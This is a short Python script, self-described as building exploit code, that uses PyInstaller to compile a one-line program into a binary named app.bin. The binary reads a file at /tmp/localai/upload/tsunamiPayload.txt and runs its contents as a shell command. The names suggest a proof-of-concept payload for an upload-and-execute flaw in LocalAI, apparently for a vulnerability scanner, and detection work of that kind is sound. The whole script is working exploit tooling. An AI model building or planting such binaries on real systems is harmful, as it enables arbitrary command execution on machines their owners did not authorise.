import tempfile
import PyInstaller.__main__
import os

# Builds exploit code
def build():
    CODE = 'import os; os.system(open("/tmp/localai/upload/tsunamiPayload.txt").read().strip())' # Python code we want to run
    appname="app.bin"
    with tempfile.NamedTemporaryFile(delete=False) as fp:
        fp.write(CODE.encode())
        fp.close()
        PyInstaller.__main__.run(["--onefile","--clean","--workpath","/tmp/build/","--specpath","/tmp","--distpath",".","-n",appname,fp.name])

if __name__ == "__main__":
	build();

